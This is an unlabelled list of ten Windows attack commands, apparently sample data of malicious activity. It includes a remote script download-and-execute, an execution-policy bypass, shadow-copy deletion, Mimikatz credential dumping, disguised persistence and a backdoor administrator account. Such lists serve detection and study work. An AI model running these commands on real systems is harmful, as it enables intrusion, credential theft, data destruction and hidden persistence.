IEX (New-Object System.Net.WebClient).DownloadString("http://192.168.1.100/stage2.ps1")
powershell.exe -ExecutionPolicy Bypass -File $env:TEMP\dropper.ps1
powershell -enc U3RhcnQtUHJvY2VzcyBjbWQgLVdpbmRvd1N0eWxlIEhpZGRlbg==
vssadmin delete shadows /all /quiet
Invoke-Mimikatz -DumpCreds -ComputerName $env:COMPUTERNAME
schtasks /create /tn "WindowsDefenderUpdate" /tr "C:\Users\Public\malware.exe" /sc onlogon /f
[System.Convert]::FromBase64String("bWFsd2FyZSBwYXlsb2Fk")
Start-Process cmd.exe -WindowStyle Hidden -ArgumentList "/c net user hacker P@ssw0rd /add"
net localgroup administrators hacker /add
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\malware.exe /f
